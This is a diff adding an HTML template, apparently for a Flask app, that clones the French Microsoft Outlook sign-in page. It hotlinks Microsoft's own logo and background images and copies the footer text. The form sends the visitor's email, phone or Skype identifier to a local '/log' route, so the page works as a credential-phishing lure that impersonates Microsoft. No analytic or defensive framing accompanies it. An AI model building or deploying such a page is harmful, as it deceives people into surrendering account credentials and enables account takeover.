@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Se connecter à Outlook</title>
+  <link rel="icon" type="image/png" href="{{ url_for('static', filename='Logo Microsoft.png') }}">
+
+  
+  
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto,
+                   Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI",
+                   "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee,
+                   "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa",
+                   "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa",
+                   "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli",
+                   "Myanmar Text", "Cambria Math", sans-serif;
+      font-weight: 400;
+      font-size: 0.9375rem;
+      line-height: 1.25rem;
+      background: url('https://logincdn.msftauth.net/shared/5/images/78_3a53c38a2dc671fb4daf.jpg') no-repeat center center fixed;
+      background-size: cover;
+    }
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+    }
+    .login-box {
+      background-color: #fff;
+      width: 440px;
+      padding: 40px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    }
+    .login-box img {
+      height: 24px;
+      margin-bottom: 24px;
+    }
+    .login-box h2 {
+      font-size: 18px;
+      margin-bottom: 5px;
+      color: #1b1b1b;
+    }
+    .login-box p.subtitle {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+    .login-box input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      border: 1px solid #ccc;
+      border-radius: 2px;
+      font-size: 14px;
+    }
+    .login-box button {
+      background-color: #0078D4;
+      border: none;
+      color: white;
+      padding: 9px 22px;
+      font-size: 14px;
+      cursor: pointer;
+      border-radius: 2px;
+      margin-bottom: 16px;
+      display: block;
+      margin-left: auto;
+    }
+    .login-box .options-link,
+    .login-box .new-account {
+      font-size: 12px;
+      color: #1a73e8;
+      text-decoration: none;
+    }
+    .login-box .options-section {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      font-size: 13px;
+      color: #444;
+      border-top: 1px solid #ddd;
+      margin-top: 20px;
+      padding-top: 10px;
+    }
+    .login-box .options-section img {
+      width: 20px;
+      height: 20px;
+      margin-right: 8px;
+    }
+    .footer {
+      position: absolute;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 11px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft">
+      <h2>Connexion</h2>
+      <p class="subtitle">Continuer vers Outlook</p>
+      <form action="/log" method="POST">
+        <input type="text" name="email" placeholder="E-mail, téléphone ou identifiant Skype" required>
+        <button type="submit">Suivant</button>
+      </form>
+      <p style="font-size: 12px; color: #555; margin-top: -8px;">
+        Vous n’avez pas encore de compte ? <a class="new-account" href="#">Créez-en un !</a>
+      </p>
+      <div class="options-section">
+        <img src="https://logincdn.msftauth.net/shared/5/images/signin_options_4e48046ce74f4b89d450.svg" alt="clé">
+        <span>Options de connexion</span>
+      </div>
+    </div>
+  </div>
+  <div class="footer">
+    Conditions d'utilisation · Confidentialité et cookies · Accessibilité · partiellement conforme
+  </div>
+</body>
+</html>
+
+
